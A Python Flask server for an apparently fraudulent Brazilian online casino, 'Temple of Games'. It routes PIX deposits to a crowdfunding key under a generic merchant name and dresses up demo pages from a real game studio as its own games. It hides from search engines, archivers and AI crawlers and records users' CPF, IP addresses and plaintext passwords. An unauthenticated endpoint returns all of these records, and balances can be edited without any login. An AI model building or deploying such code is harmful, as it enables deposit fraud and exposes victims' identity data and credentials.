#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Temple of Games — Flask + PIX estático. Versão limpa + anti-index."""

import os, json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, Response, abort

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
PUBLIC_DIR  = os.path.join(BASE_DIR, "public")

app = Flask(__name__, static_folder=PUBLIC_DIR, static_url_path="")

# ============ CONFIG ============
PIX_KEY       = "6377167@vakinha.com.br"
MERCHANT_NAME = "PAGAMENTO"
MERCHANT_CITY = "BRASIL"
VALOR_MINIMO  = 5.00
ADMIN_SENHA   = "temple2026"

USERS_FILE  = os.path.join(BASE_DIR, "usuarios.json")
PIX_FILE    = os.path.join(BASE_DIR, "pix_pendentes.json")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")

# ============ ANTI-GOOGLE / ANTI-BOT ============
BOTS_BLOQUEADOS = (
    "googlebot", "bingbot", "yandex", "baiduspider", "duckduckbot",
    "slurp", "sogou", "exabot", "facebot", "ia_archiver",
    "semrush", "ahrefs", "mj12bot", "dotbot", "petalbot",
    "applebot", "bytespider", "gptbot", "ccbot", "claudebot",
    "perplexitybot", "amazonbot"
)

def is_bot(ua: str) -> bool:
    if not ua: return True
    ua = ua.lower()
    return any(b in ua for b in BOTS_BLOQUEADOS)

@app.before_request
def bloquear_bots():
    # Deixa /admin passar (voce usa)
    if request.path.startswith("/admin"):
        return None
    ua = request.headers.get("User-Agent", "")
    if is_bot(ua):
        return Response("Acesso restrito.", status=403)

@app.after_request
def headers_anti_index(resp):
    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
    resp.headers["X-Frame-Options"] = "SAMEORIGIN"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    return resp

# ============ ARQUIVOS ============
CONFIG_PADRAO = {
    "empresa": {"nome": "Temple of Games",
                "descricao_pix": "Temple of Games - Creditos",
                "logo_emoji": "🎰"},
    "banner": "ONLINE CASINO GAMES",
    "cores": {"dourado": "#d4af37", "dourado_claro": "#f0c040"},
    "jogos": [
        {"nome": "Zeus vs Hades",
         "link": "https://www.pragmaticplay.com/br/jogos/zeus-vs-hades-gods-of-war-250/?gamelang=br&cur=BRL",
         "imagem": "https://i.ibb.co/PzcPLBtg/Screenshot-2026-09-30-10-34-24-313-com-android-chrome.png"},
        {"nome": "Fortune Tiger",
         "link": "https://templeofgames.com/gameDetailIos?gameId=23537",
         "imagem": "https://i.ibb.co/bRgRw8kF/Screenshot-2026-09-30-10-34-02-165-com-android-chrome.png"},
        {"nome": "Gates of Olympus",
         "link": "https://www.pragmaticplay.com/br/jogos/gates-of-olympus/",
         "imagem": "https://i.ibb.co/PvtjC7rg/Screenshot-2026-09-30-10-33-44-230-com-android-chrome.png"},
        {"nome": "Fortune Rabbit",
         "link": "https://templeofgames.com/gameDetailIos?gameId=23536",
         "imagem": "https://i.ibb.co/bTkYQCz/Screenshot-2026-09-30-10-33-26-327-com-android-chrome.png"},
        {"nome": "Fortune Ox",
         "link": "https://templeofgames.com/gameDetailIos?gameId=12475",
         "imagem": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPlVsMXAaZ130eBumGDhW3NVDNn5-LTJx-mqtT5ha3ww&s=10"},
        {"nome": "Tigre Sortudo",
         "link": "#",
         "imagem": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRIuMG3iUsuQD8dvF50cbQiohl7vcsek71fV98_pRYCg&s=10"},
        {"nome": "Fortune Dragon",
         "link": "#",
         "imagem": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYNKBNAec0CrMnlVic1KyG0f80jsI9Q9WmYhBY7NlSPw&s=10"},
        {"nome": "Area VIP - Faca 2 depositos no minimo para liberar",
         "link": "#vip",
         "imagem": "https://casasdeapostasonline.pt/wp-content/uploads/2024/11/pragmatic.jpg",
         "vip": True}
    ]
}

def ler_json(c, p):
    if not os.path.exists(c): return p
    try:
        with open(c, "r", encoding="utf-8") as f: return json.load(f)
    except Exception: return p

def salvar_json(c, d):
    with open(c, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)

def get_config():
    cfg = ler_json(CONFIG_FILE, None)
    if not cfg:
        salvar_json(CONFIG_FILE, CONFIG_PADRAO)
        return CONFIG_PADRAO
    for k, v in CONFIG_PADRAO.items():
        if k not in cfg: cfg[k] = v
    return cfg

def get_ip_cliente():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    if request.headers.get("CF-Connecting-IP"):
        return request.headers.get("CF-Connecting-IP")
    return request.remote_addr or "desconhecido"

# ============ PIX ============
def campo(tag, valor):
    valor = str(valor)
    return f"{tag}{len(valor):02d}{valor}"

def crc16(payload):
    crc = 0xFFFF
    for byte in payload.encode("utf-8"):
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return f"{crc:04X}"

def gerar_pix(valor, txid="***"):
    valor_pix = f"{float(valor):.2f}"
    merchant_account = campo("00", "br.gov.bcb.pix") + campo("01", PIX_KEY)
    payload = (
        campo("00", "01") + campo("01", "11") +
        campo("26", merchant_account) +
        campo("52", "0000") + campo("53", "986") +
        campo("54", valor_pix) + campo("58", "BR") +
        campo("59", MERCHANT_NAME) + campo("60", MERCHANT_CITY) +
        campo("62", campo("05", txid)) + "6304"
    )
    return payload + crc16(payload)

# ============ ROBOTS.TXT ============
@app.route("/robots.txt")
def robots():
    return Response("User-agent: *\nDisallow: /\n", mimetype="text/plain")

# ============ ROTAS ============
@app.route("/")
def root(): return send_from_directory(PUBLIC_DIR, "index.html")

@app.route("/<path:path>")
def static_files(path): return send_from_directory(PUBLIC_DIR, path)

@app.route("/api/config")
def api_get_config(): return jsonify(get_config())

@app.route("/api/usuarios", methods=["GET"])
def listar_usuarios(): return jsonify(ler_json(USERS_FILE, {}))

@app.route("/api/usuarios", methods=["POST"])
def salvar_usuario():
    data = request.get_json() or {}
    email = (data.get("email") or "").strip().lower()
    if not email: return jsonify({"erro": "E-mail obrigatorio"}), 400
    users = ler_json(USERS_FILE, {})
    if email in users: return jsonify({"erro": "E-mail ja cadastrado"}), 409
    users[email] = {
        "nome": (data.get("nome") or "").strip(),
        "cpf":  (data.get("cpf") or "").strip(),
        "email": email, "senha": data.get("senha", ""),
        "nasc": data.get("nasc", ""), "saldo": 0.0, "historico": [],
        "ip_capturado": get_ip_cliente(),
        "criado_em": datetime.now().isoformat(),
        "user_agent": request.headers.get("User-Agent", "")[:200]
    }
    salvar_json(USERS_FILE, users)
    return jsonify({"ok": True, "email": email})

@app.route("/api/usuarios/<email>", methods=["GET"])
def obter_usuario(email):
    u = ler_json(USERS_FILE, {}).get(email.lower())
    if not u: return jsonify({"erro": "Usuario nao encontrado"}), 404
    return jsonify({k: v for k, v in u.items() if k != "senha"})

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json() or {}
    email = (data.get("email") or "").strip().lower()
    senha = data.get("senha", "")
    u = ler_json(USERS_FILE, {}).get(email)
    if not u: return jsonify({"erro": "E-mail nao cadastrado"}), 404
    if u.get("senha") != senha: return jsonify({"erro": "Senha incorreta"}), 401
    return jsonify({"ok": True, "nome": u.get("nome"), "email": u.get("email"),
                    "saldo": u.get("saldo", 0.0)})

@app.route("/api/usuarios/<email>/saldo", methods=["POST"])
def atualizar_saldo(email):
    data = request.get_json() or {}
    delta = float(data.get("delta", 0))
    motivo = data.get("motivo", "Ajuste")
    users = ler_json(USERS_FILE, {})
    u = users.get(email.lower())
    if not u: return jsonify({"erro": "Usuario nao encontrado"}), 404
    u["saldo"] = round((u.get("saldo", 0.0) + delta), 2)
    u.setdefault("historico", []).insert(0, {
        "tipo": motivo, "valor": delta, "data": datetime.now().isoformat()})
    u["historico"] = u["historico"][:50]
    salvar_json(USERS_FILE, users)
    return jsonify({"ok": True, "saldo": u["saldo"]})

@app.route("/api/usuarios/<email>/historico")
def historico_usuario(email):
    u = ler_json(USERS_FILE, {}).get(email.lower())
    if not u: return jsonify({"erro": "Usuario nao encontrado"}), 404
    return jsonify(u.get("historico", []))

@app.route("/api/criar-pix", methods=["POST"])
def api_criar_pix():
    data = request.get_json() or {}
    try:
        valor = float(data.get("valor", 0))
    except (TypeError, ValueError):
        return jsonify({"erro": "Valor invalido."}), 400
    if valor < VALOR_MINIMO:
        return jsonify({"erro": f"Valor minimo: R$ {VALOR_MINIMO:.2f}"}), 400

    email_user = (data.get("email") or "").strip().lower()
    txid = "VK" + datetime.now().strftime("%H%M%S")
    codigo = gerar_pix(valor, txid=txid)

    pend = ler_json(PIX_FILE, {})
    chave = f"local_{datetime.now().strftime('%Y%m%d%H%M%S')}_{email_user}"
    pend[chave] = {
        "email": email_user, "valor": valor,
        "criado_em": datetime.now().isoformat(), "status": "PENDENTE",
        "codigo": codigo
    }
    salvar_json(PIX_FILE, pend)
    return jsonify({"payment_id": chave, "payload": codigo, "encodedImage": ""})

# ============ ADMIN (interface moderna) ============
ADMIN_HTML = """<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin</title>
<meta name="robots" content="noindex,nofollow">
<style>
:root{--gold:#d4af37;--gold2:#f0c040;--bg:#08090c;--bg2:#101216;--bg3:#161a20;--bd:#22262e;--txt:#e8eaed;--mut:#8a9099;--grn:#22c55e;--red:#ef4444}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;padding:20px 20px 100px;min-height:100vh}
.wrap{max-width:1200px;margin:0 auto}
h1{font-size:24px;font-weight:700;margin-bottom:24px;background:linear-gradient(135deg,var(--gold),var(--gold2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:flex;align-items:center;gap:10px}
h2{font-size:16px;font-weight:600;color:var(--gold);margin:20px 0 12px;display:flex;align-items:center;gap:8px}
.tabs{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap;background:var(--bg2);padding:6px;border-radius:12px;border:1px solid var(--bd)}
.tab{padding:10px 18px;background:transparent;border:none;color:var(--mut);border-radius:8px;cursor:pointer;font-weight:600;font-size:13px;transition:.2s}
.tab:hover{color:var(--txt);background:var(--bg3)}
.tab.ativo{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000}
.painel{display:none;animation:fade .3s}
.painel.ativo{display:block}
@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.card{background:var(--bg2);border:1px solid var(--bd);border-radius:14px;padding:20px;margin-bottom:16px}
label{display:block;font-size:11px;color:var(--mut);text-transform:uppercase;margin:12px 0 6px;letter-spacing:.8px;font-weight:600}
input{width:100%;padding:12px 14px;background:var(--bg);border:1px solid var(--bd);color:var(--txt);border-radius:10px;font-size:14px;font-family:inherit;transition:.2s}
input:focus{outline:none;border-color:var(--gold);box-shadow:0 0 0 3px rgba(212,175,55,.1)}
button{padding:12px 20px;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:13px;transition:.2s;font-family:inherit}
button:hover{transform:translateY(-1px);filter:brightness(1.1)}
.btn-gold{background:linear-gradient(135deg,var(--gold),var(--gold2));color:#000}
.btn-red{background:var(--red);color:#fff}
.btn-green{background:var(--grn);color:#000}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-bottom:20px}
.stat{background:linear-gradient(135deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:14px;padding:18px;position:relative;overflow:hidden}
.stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--gold),transparent)}
.stat b{color:var(--mut);display:block;font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;font-weight:600}
.stat span{font-size:26px;font-weight:800;color:var(--gold)}
.stat.grn span{color:var(--grn)}
table{width:100%;border-collapse:collapse;font-size:13px;background:var(--bg2);border-radius:12px;overflow:hidden}
th{background:var(--bg3);color:var(--gold);padding:12px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.8px;font-weight:700;border-bottom:1px solid var(--bd)}
td{padding:12px;border-bottom:1px solid var(--bd);font-size:12px}
tr:last-child td{border-bottom:none}
tr:hover td{background:var(--bg3)}
.jogo-editor{display:grid;grid-template-columns:80px 1fr auto;gap:12px;align-items:flex-start;background:var(--bg3);padding:14px;border-radius:12px;border:1px solid var(--bd);margin-bottom:10px}
.jogo-editor img{width:80px;height:80px;object-fit:cover;border-radius:8px;background:#000}
.jogo-editor .campos{display:flex;flex-direction:column;gap:8px}
.jogo-editor .campos input{font-size:12px;padding:9px 12px}
.msg{padding:14px;border-radius:10px;margin-top:16px;font-size:13px;font-weight:600;display:none;position:fixed;bottom:100px;left:20px;right:20px;z-index:100;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.msg.ok{background:#052e16;color:#4ade80;border:1px solid var(--grn);display:block}
.msg.erro{background:#450a0a;color:#f87171;border:1px solid var(--red);display:block}
.salvar-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(16,18,22,.95);backdrop-filter:blur(12px);padding:14px 20px;border-top:1px solid var(--bd);display:flex;gap:10px;max-width:1200px;margin:0 auto;left:50%;transform:translateX(-50%);border-radius:14px 14px 0 0}
.salvar-bar button{flex:1;margin:0}
@media(max-width:600px){h1{font-size:20px}.tab{padding:8px 12px;font-size:12px}.stat span{font-size:20px}}
</style></head><body>
<div class="wrap">
<h1>🎰 Painel Admin</h1>
<div class="tabs">
  <button class="tab ativo" onclick="mostrarAba('stats', this)">📊 Stats</button>
  <button class="tab" onclick="mostrarAba('config', this)">⚙️ Config</button>
  <button class="tab" onclick="mostrarAba('jogos', this)">🎰 Jogos</button>
  <button class="tab" onclick="mostrarAba('users', this)">👥 Usuários</button>
  <button class="tab" onclick="mostrarAba('pix', this)">💰 PIX</button>
</div>
<div class="painel ativo" id="painel-stats"><div class="stats" id="stats"></div></div>
<div class="painel" id="painel-config">
  <div class="card">
    <h2>🏢 Empresa</h2>
    <label>Nome</label><input id="cfg_nome">
    <label>Descrição PIX</label><input id="cfg_desc">
    <label>Emoji logo</label><input id="cfg_logo">
    <label>Banner</label><input id="cfg_banner">
    <label>Cor dourada</label><input id="cfg_dourado" type="color">
    <label>Cor dourada clara</label><input id="cfg_dourado2" type="color">
  </div>
</div>
<div class="painel" id="painel-jogos">
  <h2>🎰 Lista de Jogos</h2>
  <div id="lista-jogos"></div>
  <button class="btn-green" onclick="addJogo()">➕ Adicionar Jogo</button>
</div>
<div class="painel" id="painel-users">
  <h2>👥 Usuários</h2>
  <div style="overflow-x:auto"><table id="tabela-users">
    <thead><tr><th>Nome</th><th>E-mail</th><th>CPF</th><th>Saldo</th><th>IP</th><th>Data</th><th>Ação</th></tr></thead>
    <tbody></tbody>
  </table></div>
</div>
<div class="painel" id="painel-pix">
  <h2>💰 PIX Pendentes</h2>
  <p style="font-size:12px;color:var(--mut);margin-bottom:14px">Confirme manualmente quando o PIX cair.</p>
  <div style="overflow-x:auto"><table id="tabela-pix">
    <thead><tr><th>Usuário</th><th>Valor</th><th>Criado</th><th>Status</th><th>Ação</th></tr></thead>
    <tbody></tbody>
  </table></div>
</div>
<div class="msg" id="msg"></div>
<div class="salvar-bar">
  <button class="btn-gold" onclick="salvarTudo()">💾 Salvar Tudo</button>
  <button class="btn-gold" onclick="location.reload()" style="max-width:100px">🔄</button>
</div>
</div>
<script>
const SENHA=new URLSearchParams(location.search).get('s');
let cfg={};
function mostrarAba(n,el){
  document.querySelectorAll('.painel').forEach(p=>p.classList.remove('ativo'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('ativo'));
  document.getElementById('painel-'+n).classList.add('ativo');
  el.classList.add('ativo');
  if(n==='pix')carregarPIX();
}
function setMsg(t,ok){
  const m=document.getElementById('msg');m.textContent=t;
  m.className='msg '+(ok?'ok':'erro');
  setTimeout(()=>{m.className='msg'},3500);
}
async function carregar(){
  cfg=await(await fetch('/api/config')).json();
  const users=await(await fetch('/api/usuarios')).json();
  const total=Object.keys(users).length;
  const saldoTotal=Object.values(users).reduce((s,u)=>s+(u.saldo||0),0);
  const pend=await(await fetch('/api/pix-pendentes')).json();
  const pendN=Object.values(pend).filter(p=>p.status==='PENDENTE').length;
  document.getElementById('stats').innerHTML=
    '<div class="stat"><b>Usuários</b><span>'+total+'</span></div>'+
    '<div class="stat grn"><b>Saldo total</b><span>R$ '+saldoTotal.toFixed(2)+'</span></div>'+
    '<div class="stat"><b>PIX pendentes</b><span>'+pendN+'</span></div>'+
    '<div class="stat grn"><b>Sistema</b><span style="font-size:16px">Online</span></div>';
  document.getElementById('cfg_nome').value=cfg.empresa.nome||'';
  document.getElementById('cfg_desc').value=cfg.empresa.descricao_pix||'';
  document.getElementById('cfg_logo').value=cfg.empresa.logo_emoji||'';
  document.getElementById('cfg_banner').value=cfg.banner||'';
  document.getElementById('cfg_dourado').value=(cfg.cores&&cfg.cores.dourado)||'#d4af37';
  document.getElementById('cfg_dourado2').value=(cfg.cores&&cfg.cores.dourado_claro)||'#f0c040';
  renderJogos();renderUsers(users);
}
function renderJogos(){
  document.getElementById('lista-jogos').innerHTML=cfg.jogos.map((j,i)=>
    '<div class="jogo-editor"><img src="'+(j.imagem||'')+'">'+
    '<div class="campos">'+
    '<input placeholder="Nome" value="'+(j.nome||'').replace(/"/g,'&quot;')+'" onchange="cfg.jogos['+i+'].nome=this.value">'+
    '<input placeholder="Link" value="'+(j.link||'').replace(/"/g,'&quot;')+'" onchange="cfg.jogos['+i+'].link=this.value">'+
    '<input placeholder="Imagem URL" value="'+(j.imagem||'').replace(/"/g,'&quot;')+'" onchange="cfg.jogos['+i+'].imagem=this.value;renderJogos()">'+
    '</div><button class="btn-red" onclick="remJogo('+i+')" style="margin-top:0">🗑</button></div>'
  ).join('');
}
function addJogo(){cfg.jogos.push({nome:'',link:'',imagem:''});renderJogos()}
function remJogo(i){if(confirm('Remover?')){cfg.jogos.splice(i,1);renderJogos()}}
function renderUsers(users){
  const tb=document.querySelector('#tabela-users tbody');
  const arr=Object.entries(users);
  if(!arr.length){tb.innerHTML='<tr><td colspan="7" style="text-align:center;color:var(--mut);padding:30px">Nenhum usuário ainda.</td></tr>';return}
  tb.innerHTML=arr.map(p=>{
    const e=p[0],u=p[1];
    return '<tr><td>'+(u.nome||'—')+'</td><td>'+e+'</td><td>'+(u.cpf||'—')+'</td>'+
    '<td style="color:var(--grn);font-weight:700">R$ '+(u.saldo||0).toFixed(2)+'</td>'+
    '<td style="color:var(--mut)">'+(u.ip_capturado||'—')+'</td>'+
    '<td style="color:var(--mut)">'+((u.criado_em||'').slice(0,16).replace('T',' '))+'</td>'+
    '<td><button class="btn-green" style="padding:6px 12px;font-size:11px;margin:0" onclick="addSaldo(\\''+e+'\\')">+ R$</button></td></tr>'
  }).join('');
}
async function addSaldo(email){
  const v=prompt("Adicionar saldo para "+email+":");
  if(!v)return;
  const valor=parseFloat(v.replace(",","."));
  if(!valor||valor<=0)return alert("Valor inválido");
  const r=await fetch('/api/usuarios/'+encodeURIComponent(email)+'/saldo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({delta:valor,motivo:"Depósito manual"})});
  if(r.ok){setMsg('✅ Saldo adicionado!',true);carregar()}else setMsg('❌ Erro',false);
}
async function carregarPIX(){
  const pix=await(await fetch('/api/pix-pendentes')).json();
  const tb=document.querySelector('#tabela-pix tbody');
  const arr=Object.entries(pix);
  if(!arr.length){tb.innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--mut);padding:30px">Nenhum PIX pendente.</td></tr>';return}
  tb.innerHTML=arr.map(p=>{
    const id=p[0],d=p[1];
    const st=d.status==='PAGO'?'<span style="color:var(--grn);font-weight:700">✅ PAGO</span>':'<span style="color:var(--gold);font-weight:700">⏳ PENDENTE</span>';
    return '<tr><td>'+d.email+'</td><td style="font-weight:700">R$ '+d.valor.toFixed(2)+'</td>'+
    '<td style="color:var(--mut)">'+((d.criado_em||'').slice(0,16).replace('T',' '))+'</td><td>'+st+'</td>'+
    '<td>'+(d.status==='PAGO'?'—':'<button class="btn-green" style="padding:6px 12px;font-size:11px;margin:0" onclick="confirmarPIX(\\''+id+'\\')">Confirmar</button>')+'</td></tr>'
  }).join('');
}
async function confirmarPIX(id){
  if(!confirm("Confirmar PIX recebido?"))return;
  const r=await fetch('/admin/confirmar-pix?s='+SENHA,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
  if(r.ok){setMsg('✅ Confirmado!',true);carregarPIX();carregar()}else setMsg('❌ Erro',false);
}
async function salvarTudo(){
  cfg.empresa.nome=document.getElementById('cfg_nome').value;
  cfg.empresa.descricao_pix=document.getElementById('cfg_desc').value;
  cfg.empresa.logo_emoji=document.getElementById('cfg_logo').value;
  cfg.banner=document.getElementById('cfg_banner').value;
  cfg.cores={dourado:document.getElementById('cfg_dourado').value,dourado_claro:document.getElementById('cfg_dourado2').value};
  const r=await fetch('/admin/salvar?s='+SENHA,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(cfg)});
  if(r.ok)setMsg('✅ Salvo!',true);else setMsg('❌ Erro',false);
}
carregar();
</script></body></html>"""

@app.route("/admin")
def admin_panel():
    if request.args.get("s", "") != ADMIN_SENHA:
        return """<html><body style='background:#000;color:#fff;font-family:Arial;padding:40px'>
        <h2>🔒 Admin</h2><form method='get'>
        <input name='s' type='password' placeholder='Senha' style='padding:12px;font-size:16px;border-radius:8px;border:1px solid #333;background:#111;color:#fff'>
        <button type='submit' style='padding:12px 24px;background:#d4af37;border:none;font-weight:bold;border-radius:8px;cursor:pointer'>Entrar</button>
        </form></body></html>""", 401
    return ADMIN_HTML

@app.route("/admin/salvar", methods=["POST"])
def admin_salvar():
    if request.args.get("s", "") != ADMIN_SENHA:
        return jsonify({"erro": "Senha invalida"}), 401
    salvar_json(CONFIG_FILE, request.get_json() or {})
    return jsonify({"ok": True})

@app.route("/api/pix-pendentes", methods=["GET"])
def api_pix_pendentes():
    return jsonify(ler_json(PIX_FILE, {}))

@app.route("/admin/confirmar-pix", methods=["POST"])
def admin_confirmar_pix():
    if request.args.get("s", "") != ADMIN_SENHA:
        return jsonify({"erro": "Senha invalida"}), 401
    data = request.get_json() or {}
    pid = data.get("id")
    pix = ler_json(PIX_FILE, {})
    info = pix.get(pid)
    if not info: return jsonify({"erro": "PIX nao encontrado"}), 404
    if info.get("status") == "PAGO": return jsonify({"ok": True})
    users = ler_json(USERS_FILE, {})
    u = users.get(info["email"])
    if u:
        u["saldo"] = round(u.get("saldo", 0.0) + info["valor"], 2)
        u.setdefault("historico", []).insert(0, {
            "tipo": "Deposito PIX", "valor": info["valor"],
            "data": datetime.now().isoformat()})
        u["historico"] = u["historico"][:50]
        salvar_json(USERS_FILE, users)
    info["status"] = "PAGO"
    info["pago_em"] = datetime.now().isoformat()
    salvar_json(PIX_FILE, pix)
    return jsonify({"ok": True})

if __name__ == "__main__":
    get_config()
    port = int(os.environ.get("PORT", 8080))
    print("=" * 60)
    print("  TEMPLE OF GAMES - Servidor rodando")
    print(f"  Local:  http://127.0.0.1:{port}")
    print(f"  Admin:  http://127.0.0.1:{port}/admin?s={ADMIN_SENHA}")
    print(f"  PIX:    {PIX_KEY}")
    print("=" * 60)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
